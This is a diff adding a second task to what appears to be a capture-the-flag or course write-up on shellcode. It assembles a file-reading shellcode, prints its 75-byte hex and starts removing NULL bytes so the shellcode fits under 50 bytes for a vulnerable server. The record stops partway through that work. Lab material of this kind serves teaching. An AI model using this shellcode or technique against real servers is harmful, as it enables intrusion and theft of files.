@@ -41,3 +41,30 @@ Take the output and execute the shellcode with the pwntools script that we built
 
 
 ## Task 2:
+
+We're given an assembly file for generating a shellcode to run on a vulnerable server. In order to do so we need to optimize flag.s so that it is less than 50 bytes.
+
+Lets start by generating an ELF file from the assembly file:
+
+    ./assembler.sh flag.s
+
+Now we can inspect it:
+
+    ./Documents/Scripts/shellcode.py flag
+    Hex:
+    6a0048bf2f666c672e74787457b8020000004889e7be000000000f05488d374889c7b800000000ba180000000f05b801000000bf01000000ba180000000f05b83c000000bf000000000f05
+    
+    75 bytes - Found NULL byte
+
+The output reveals that we have a significant number of NULL bytes, so lets start here.
+
+- Lets examine the ELF file:
+
+        objdump -d flag
+
+    We can see that the first push instruction, and most mov instructions are responsible for the NULL bytes.
+
+    Lets fix this with and xor for the push, and adjust the sub-registers.
+
+
+
